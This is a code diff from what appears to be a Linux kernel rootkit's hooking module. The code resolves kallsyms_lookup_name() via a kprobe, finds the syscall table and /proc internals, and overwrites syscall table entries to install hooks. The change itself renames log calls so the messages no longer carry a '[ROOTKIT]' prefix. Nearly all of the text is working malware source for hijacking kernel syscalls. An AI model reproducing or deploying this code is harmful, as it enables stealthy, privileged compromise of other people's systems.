@@ -70,19 +70,19 @@ int __init init_hooking(void)
     };
 
     IF_U (lookup_name != NULL) {
-        pr_err("[ROOTKIT] Hooking module already initialized.\n");
+        pr_dev_err("Hooking module already initialized.\n");
         return -EALREADY;
     }
 
     i32_err = register_kprobe(&probe);
     IF_U (i32_err) {
-        pr_err("[ROOTKIT] Failed to get kallsyms_lookup_name() address.\n");
+        pr_dev_err("Failed to get kallsyms_lookup_name() address.\n");
         return i32_err;
     }
 
     // Function pointer type of kallsyms_lookup_name()
     lookup_name = (kallsyms_t)(probe.addr);
-    pr_info("[ROOTKIT] kallsym_lookup_name() address: %p\n", lookup_name);
+    pr_dev_info("kallsym_lookup_name() address: %p\n", lookup_name);
 
     // Cleanup kprobe as we don't need it anymore
     unregister_kprobe(&probe);
@@ -90,29 +90,29 @@ int __init init_hooking(void)
     // Find syscall table address
     p_syscall_table = lookup_name(SYS_CALL_TABLE_NAME);
     IF_U (p_syscall_table == NULL) {
-        pr_err("[ROOTKIT] Failed to get sys_call_table address.\n");
+        pr_dev_err("Failed to get sys_call_table address.\n");
         return -ENOENT;
     }
 
-    pr_info("[ROOTKIT] Syscall table address: %p\n", p_syscall_table);
+    pr_dev_info("Syscall table address: %p\n", p_syscall_table);
 
     // Find /proc root directory
     p_proc_root = lookup_name("proc_root");
     IF_U (p_proc_root == NULL) {
-        pr_err("[ROOTKIT] Failed to get /proc root directory entry address.\n");
+        pr_dev_err("Failed to get /proc root directory entry address.\n");
         return -ENOENT;
     }
 
-    pr_info("[ROOTKIT] /proc root directory entry address: %p\n", p_proc_root);
+    pr_dev_info("/proc root directory entry address: %p\n", p_proc_root);
 
     // Find pde_subdir_find() address
     pde_subdir_find = lookup_name("pde_subdir_find");
     IF_U (pde_subdir_find == NULL) {
-        pr_err("[ROOTKIT] Failed to get pde_subdir_find() address.\n");
+        pr_dev_err("Failed to get pde_subdir_find() address.\n");
         return -ENOENT;
     }
 
-    pr_info("[ROOTKIT] pde_subdir_find() address: %p\n", pde_subdir_find);
+    pr_dev_info("pde_subdir_find() address: %p\n", pde_subdir_find);
 
     return 0;
 }
@@ -133,7 +133,7 @@ void set_syscall_entry(const size_t sz_syscall_nr, const sysfun_t new_sysfun)
 
 int hook_syscall(hook_t *const p_hook)
 {
-    pr_info("[ROOTKIT] Hooking syscall %zu\n", p_hook->sz_syscall_nr);
+    pr_dev_info("Hooking syscall %zu\n", p_hook->sz_syscall_nr);
 
     *(p_hook->p_orig_sysfun) = get_syscall_entry(p_hook->sz_syscall_nr);
     set_syscall_entry(p_hook->sz_syscall_nr, p_hook->new_sysfun);
@@ -143,7 +143,7 @@ int hook_syscall(hook_t *const p_hook)
 
 void unhook_syscall(const hook_t *const p_hook)
 {
-    pr_info("[ROOTKIT] Unhooking syscall %zu\n", p_hook->sz_syscall_nr);
+    pr_dev_info("Unhooking syscall %zu\n", p_hook->sz_syscall_nr);
 
     set_syscall_entry(p_hook->sz_syscall_nr, *(p_hook->p_orig_sysfun));
 }
@@ -156,7 +156,7 @@ int __init hook_syscalls(hook_t p_hooks[])
     for (i = 0; p_hooks[i].new_sysfun != NULL; ++i) {
         i32_err = hook_syscall(&p_hooks[i]);
         IF_U (i32_err) {
-            pr_err("[ROOTKIT] Failed to hook syscall %zu (n. %zu)\n", p_hooks[i].sz_syscall_nr, i);
+            pr_dev_err("Failed to hook syscall %zu (n. %zu)\n", p_hooks[i].sz_syscall_nr, i);
 
             // Rollback previous hooks before returning the error
             while (i > 0) {
